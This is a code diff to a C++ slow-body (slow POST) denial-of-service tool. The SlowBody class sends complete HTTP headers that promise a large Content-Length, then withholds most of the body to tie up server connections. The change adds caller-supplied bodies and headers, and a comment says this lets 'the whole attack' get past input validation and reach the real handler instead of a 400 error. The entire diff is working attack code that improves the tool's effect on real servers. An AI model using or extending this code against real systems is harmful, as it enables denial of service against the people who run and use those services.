@@ -13,8 +13,13 @@ const char kOpeningBody[] = "foo=bar";
 
 SlowBody::SlowBody(const Config& cfg)
     : cfg_(cfg),
+      // A caller-supplied payload replaces the placeholder entirely: endpoints
+      // that validate their input reject "foo=bar" before the hold can bite, so
+      // the whole attack lands on a 400 handler instead of the real one.
+      opening_body_bytes_(cfg.body_data.empty() ? std::string(kOpeningBody)
+                                                : cfg.body_data),
       headers_(build_headers()),
-      opening_body_(sizeof(kOpeningBody) - 1),
+      opening_body_(opening_body_bytes_.size()),
       interval_(std::chrono::duration_cast<Millis>(cfg.interval)),
       rng_(std::random_device{}()),
       body_sent_(static_cast<std::size_t>(cfg.connections), 0) {}
@@ -54,21 +59,20 @@ std::string SlowBody::build_headers() const {
   req.reserve(320);
   req += cfg_.effective_verb();
   req += ' ';
-  req += cfg_.target.path;
+  req += cfg_.request_target();
   req += " HTTP/1.1\r\n";
-  req += "Host: " + cfg_.target.host + "\r\n";
+  req += "Host: " + cfg_.target.host_in_url() + "\r\n";
   req += "User-Agent: " + cfg_.user_agent + "\r\n";
   // The promise the server will wait on: far more body than we intend to send.
   req += "Content-Length: " + std::to_string(cfg_.content_length) + "\r\n";
   req += "Content-Type: " + cfg_.content_type + "\r\n";
   req += "Accept: " + cfg_.accept + "\r\n";
-  if (!cfg_.cookie.empty()) req += "Cookie: " + cfg_.cookie + "\r\n";
-  if (!cfg_.extra_header.empty()) req += cfg_.extra_header + "\r\n";
+  req += cfg_.caller_headers();
   req += "Connection: close\r\n";
   // Headers end here -- deliberately complete, unlike Slowloris. Only the body
   // that follows is withheld.
   req += "\r\n";
-  req += kOpeningBody;
+  req += opening_body_bytes_;
   return req;
 }
 
